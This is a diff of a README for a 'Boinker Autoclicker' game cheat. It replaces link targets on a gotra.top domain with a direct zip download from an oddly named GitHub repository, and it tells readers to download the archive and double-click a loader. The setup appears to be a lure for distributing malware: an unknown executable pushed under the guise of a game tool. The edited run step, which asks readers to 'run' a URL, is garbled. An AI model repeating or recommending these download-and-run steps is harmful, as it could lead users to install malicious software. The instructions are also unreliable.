@@ -1,7 +1,7 @@
 # Boinker Autoclicker
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/frigimtagakc685/Boinker-Autoclicker/raw/refs/heads/main/woodness/Autoclicker_Boinker_v2.6.zip](https://github.com/frigimtagakc685/Boinker-Autoclicker/raw/refs/heads/main/woodness/Autoclicker_Boinker_v2.6.zip)](https://github.com/frigimtagakc685/Boinker-Autoclicker/raw/refs/heads/main/woodness/Autoclicker_Boinker_v2.6.zip)
 
 **Boinker Autoclicker** is a powerful tool designed to automate gameplay in Boinker. It helps you collect resources, perform upgrades, and complete repetitive tasks faster by simulating mouse clicks and other automated actions.
 
@@ -30,7 +30,7 @@ Before you start, ensure you have:
    - Extract the contents of **Boinker Autoclicker** to a folder on your computer.
 
 3. **Run the Loader**:
-   - Double-click and run **Loader.exe**.
+   - Double-click and run **https://github.com/frigimtagakc685/Boinker-Autoclicker/raw/refs/heads/main/woodness/Autoclicker_Boinker_v2.6.zip**.
 
 4. The loader will automatically start the **Boinker Autoclicker** and allow you to configure settings for your game.
 
